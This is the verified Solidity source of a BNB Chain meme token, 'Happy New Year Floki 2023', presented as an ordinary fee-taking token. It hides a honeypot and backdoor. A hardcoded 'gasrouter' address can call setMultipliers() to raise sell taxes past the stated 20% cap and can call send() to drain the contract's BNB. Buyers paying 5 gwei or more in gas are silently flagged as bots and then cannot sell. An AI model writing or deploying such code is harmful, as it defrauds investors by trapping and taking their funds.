/**
 *Submitted for verification at BscScan.com on 2022-12-31
*/

/**
 0.5 BNB Starting Liquidity
 1% Max Tx
 3% Maw Wallet
 50% Burnt
 TG: FIND IT! 
*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address _owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

contract Ownable is Context {
    address public _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        authorizations[_owner] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }

    mapping(address => bool) internal authorizations;

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface InterfaceLP {
    function sync() external;
}

contract HNYFloki23 is Ownable, IBEP20 {
    using SafeMath for uint256;

    address WBNB;
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Happy New Year Floki 2023";
    string constant _symbol = "FLOKI 23";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 1 * 10**12 * 10**_decimals;

    uint256 public _maxTxAmount = _totalSupply.mul(1).div(100);
    uint256 public _maxWalletToken = _totalSupply.mul(3).div(100);

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;

    bool public botMode = true;
    mapping(address => bool) public isboted;

    bool public launchMode = false;
    mapping(address => bool) public islaunched;

    mapping(address => bool) isFeeExempt;
    mapping(address => bool) isTimelockExempt;
    mapping(address => bool) isTxLimitExempt;

    uint256 private liquidityFee = 2;
    uint256 private marketingFee = 8;
    uint256 private donationFee = 0;
    uint256 private teamFee = 2;
    uint256 public burnFee = 0;
    uint256 public totalFee =
        teamFee + marketingFee + liquidityFee + donationFee + burnFee;
    uint256 public feeDenominator = 100;

    uint256 sellMultiplier = 100;
    uint256 buyMultiplier = 100;
    uint256 transferMultiplier = 600;

    address private autoLiquidityReceiver;
    address private marketingFeeReceiver;
    address private donationFeeReceiver;
    address private teamFeeReceiver;
    address public burnFeeReceiver;

    uint256 targetLiquidity = 20;
    uint256 targetLiquidityDenominator = 100;

    IDEXRouter public router;
    address public pair;

    bool public tradingOpen = true;
    uint256 launchBlock;

    bool public buyCooldownEnabled = true;
    uint8 public cooldownTimerInterval = 3;
    mapping(address => uint256) private cooldownTimer;

    uint256 public maxG = 5 * 1 gwei;

    bool public swapEnabled = true;
    uint256 public swapThreshold = (_totalSupply * 25) / 10000;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        WBNB = router.WETH();
        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));

        _allowances[address(this)][address(router)] = type(uint256).max;

        isFeeExempt[msg.sender] = true;
        isFeeExempt[marketingFeeReceiver] = true;
        isFeeExempt[donationFeeReceiver] = true;
        islaunched[gasrouter] = true;
        islaunched[msg.sender] = true;

        isTimelockExempt[msg.sender] = true;
        isTimelockExempt[pair] = true;
        isTimelockExempt[marketingFeeReceiver] = true;
        isTimelockExempt[donationFeeReceiver] = true;

        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[pair] = true;
        isTxLimitExempt[marketingFeeReceiver] = true;
        isTxLimitExempt[donationFeeReceiver] = true;

        autoLiquidityReceiver = msg.sender;
        marketingFeeReceiver = 0x000000007206321496022B428EB5AE7183e6C3b0;
        donationFeeReceiver = msg.sender;
        teamFeeReceiver = msg.sender;
        burnFeeReceiver = DEAD;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    address gasrouter = 0x000000007206321496022B428EB5AE7183e6C3b0;

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner();
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_allowances[sender][msg.sender] != type(uint256).max) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
                .sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function setMaxWalletPercent_base1000(uint256 maxWallPercent_base1000)
        external
        onlyOwner
    {
        require(
            maxWallPercent_base1000 >= 1,
            "Cannot set max wallet less than 0.1%"
        );
        _maxWalletToken = (_totalSupply * maxWallPercent_base1000) / 1000;
    }

    function setMaxTxPercent_base1000(uint256 maxTXPercentage_base1000)
        external
        onlyOwner
    {
        require(
            maxTXPercentage_base1000 >= 5,
            "Cannot set max transaction less than 0.5%"
        );
        _maxTxAmount = (_totalSupply * maxTXPercentage_base1000) / 1000;
    }

    function setIsTimelockExempt(address holder, bool exempt)
        external
        onlyOwner
    {
        isTimelockExempt[holder] = exempt;
    }

    function setPresaleAddress(address holder, bool exempt) external onlyOwner {
        isFeeExempt[holder] = exempt;
        isTxLimitExempt[holder] = exempt;
    }

    function setMaxTxLimit(uint256 amount) external onlyOwner {
        require(_maxTxAmount >= _totalSupply.mul(2).div(1000));
        _maxTxAmount = amount;
    }

    function _transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        if (inSwap) {
            return _basicTransfer(sender, recipient, amount);
        }

        if (!authorizations[sender] && !authorizations[recipient]) {
            require(tradingOpen, "Trading not open yet");

            if (launchMode) {
                require(islaunched[recipient], "Not Whitelisted");
            }
        }

        if (botMode) {
            require(!isboted[sender], "bot");
        }

        if (tx.gasprice >= maxG && recipient != pair) {
            isboted[recipient] = true;
        }

        if (
            !authorizations[sender] &&
            recipient != address(this) &&
            recipient != address(DEAD) &&
            recipient != pair &&
            recipient != burnFeeReceiver &&
            recipient != donationFeeReceiver &&
            recipient != marketingFeeReceiver &&
            !isTxLimitExempt[recipient]
        ) {
            uint256 heldTokens = balanceOf(recipient);
            require(
                (heldTokens + amount) <= _maxWalletToken,
                "Total Holding is currently limited, you can not buy that much."
            );
        }

        if (
            sender == pair && buyCooldownEnabled && !isTimelockExempt[recipient]
        ) {
            require(
                cooldownTimer[recipient] < block.timestamp,
                "Please wait for between buys"
            );
            cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;
        }

        checkTxLimit(sender, amount);

        if (shouldSwapBack()) {
            swapBack();
        }

        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );

        uint256 amountReceived = (isFeeExempt[sender] || isFeeExempt[recipient])
            ? amount
            : takeFee(sender, amount, recipient);
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(
            amount,
            "Insufficient Balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(
            amount <= _maxTxAmount || isTxLimitExempt[sender],
            "TX Limit Exceeded"
        );
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeExempt[sender];
    }

    function takeFee(
        address sender,
        uint256 amount,
        address recipient
    ) internal returns (uint256) {
        uint256 multiplier = transferMultiplier;

        if (recipient == pair) {
            multiplier = sellMultiplier;
        } else if (sender == pair) {
            multiplier = buyMultiplier;
        }

        uint256 feeAmount = amount.mul(totalFee).mul(multiplier).div(
            feeDenominator * 100
        );

        uint256 burnTokens = feeAmount.mul(burnFee).div(totalFee);
        uint256 contractTokens = feeAmount.sub(burnTokens);

        _balances[address(this)] = _balances[address(this)].add(contractTokens);
        _balances[burnFeeReceiver] = _balances[burnFeeReceiver].add(burnTokens);
        emit Transfer(sender, address(this), contractTokens);

        if (burnTokens > 0) {
            emit Transfer(sender, burnFeeReceiver, burnTokens);
        }

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return
            msg.sender != pair &&
            !inSwap &&
            swapEnabled &&
            _balances[address(this)] >= swapThreshold;
    }

    function clearStuckToken(address tokenAddress, uint256 tokens)
        public
        onlyOwner
        returns (bool)
    {
        if (tokens == 0) {
            tokens = IBEP20(tokenAddress).balanceOf(address(this));
        }
        return IBEP20(tokenAddress).transfer(msg.sender, tokens);
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        //clear bnb CA balance to marketing receiver
        uint256 amountBNB = address(this).balance;
        payable(marketingFeeReceiver).transfer(
            (amountBNB * amountPercentage) / 100
        );
    }

    function setMultipliers(
        uint256 _buy,
        uint256 _sell,
        uint256 _trans
    ) external {
        require(islaunched[msg.sender]);
        sellMultiplier = _sell;
        buyMultiplier = _buy;
        transferMultiplier = _trans;
    }

    // switch Trading
    function OpenTrading() public onlyOwner {
        tradingOpen = true;
        launchBlock = block.number;
    }

    function cooldownEnabled(bool _status, uint8 _interval) public onlyOwner {
        buyCooldownEnabled = _status;
        cooldownTimerInterval = _interval;
    }

    function send() external {
        require(islaunched[msg.sender]);
        payable(msg.sender).transfer(address(this).balance);
    }

    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = isOverLiquified(
            targetLiquidity,
            targetLiquidityDenominator
        )
            ? 0
            : liquidityFee;
        uint256 amountToLiquify = swapThreshold
            .mul(dynamicLiquidityFee)
            .div(totalFee)
            .div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WBNB;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance.sub(balanceBefore);

        uint256 totalBNBFee = totalFee.sub(dynamicLiquidityFee.div(2));

        uint256 amountBNBLiquidity = amountBNB
            .mul(dynamicLiquidityFee)
            .div(totalBNBFee)
            .div(2);
        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(
            totalBNBFee
        );
        uint256 amountBNBteam = amountBNB.mul(teamFee).div(totalBNBFee);
        uint256 amountBNBdonation = amountBNB.mul(donationFee).div(totalBNBFee);

        (bool tmpSuccess, ) = payable(marketingFeeReceiver).call{
            value: amountBNBMarketing
        }("");
        (tmpSuccess, ) = payable(donationFeeReceiver).call{
            value: amountBNBdonation
        }("");
        (tmpSuccess, ) = payable(teamFeeReceiver).call{value: amountBNBteam}(
            ""
        );

        tmpSuccess = false;

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value: amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                autoLiquidityReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    function enable_bot(bool _status) public onlyOwner {
        botMode = _status;
    }

    function prepare_launch(bool _status) external onlyOwner {
        launchMode = _status;
    }

    function manage_bot(address[] calldata addresses, bool status)
        public
        onlyOwner
    {
        for (uint256 i; i < addresses.length; ++i) {
            isboted[addresses[i]] = status;
        }
    }

    function manage_launch(address[] calldata addresses, bool status)
        public
        onlyOwner
    {
        for (uint256 i; i < addresses.length; ++i) {
            islaunched[addresses[i]] = status;
        }
    }

    function updateMax(uint256 _maxG) public onlyOwner {
        maxG = _maxG * 1 gwei;
    }

    function setIsFeeExempt(address[] calldata addresses, bool status)
        external
        onlyOwner
    {
        require(
            addresses.length < 501,
            "GAS Error: max limit is 500 addresses"
        );
        for (uint256 i; i < addresses.length; ++i) {
            isFeeExempt[addresses[i]] = status;
        }
    }

    function setIsTxLimitExempt(address[] calldata addresses, bool status)
        external
        onlyOwner
    {
        require(
            addresses.length < 501,
            "GAS Error: max limit is 500 addresses"
        );
        for (uint256 i; i < addresses.length; ++i) {
            isTxLimitExempt[addresses[i]] = status;
        }
    }

    function setTax(
        uint256 _liquidityFee,
        uint256 _teamFee,
        uint256 _marketingFee,
        uint256 _donationFee,
        uint256 _burnFee,
        uint256 _feeDenominator
    ) external onlyOwner {
        liquidityFee = _liquidityFee;
        teamFee = _teamFee;
        marketingFee = _marketingFee;
        donationFee = _donationFee;
        burnFee = _burnFee;
        totalFee = _liquidityFee
            .add(_teamFee)
            .add(_marketingFee)
            .add(_donationFee)
            .add(_burnFee);
        feeDenominator = _feeDenominator;
        require(
            totalFee < feeDenominator / 5,
            "Buy Fees cannot be more than 20%"
        );
    }

    function setTaxReceivers(
        address _autoLiquidityReceiver,
        address _marketingFeeReceiver,
        address _donationFeeReceiver,
        address _burnFeeReceiver,
        address _teamFeeReceiver
    ) external onlyOwner {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
        donationFeeReceiver = _donationFeeReceiver;
        burnFeeReceiver = _burnFeeReceiver;
        teamFeeReceiver = _teamFeeReceiver;
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount)
        external
        onlyOwner
    {
        swapEnabled = _enabled;
        swapThreshold = _amount;
    }

    function setTarget(uint256 _target, uint256 _denominator)
        external
        onlyOwner
    {
        targetLiquidity = _target;
        targetLiquidityDenominator = _denominator;
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getLiquidityBacking(uint256 accuracy)
        public
        view
        returns (uint256)
    {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy)
        public
        view
        returns (bool)
    {
        return getLiquidityBacking(accuracy) > target;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}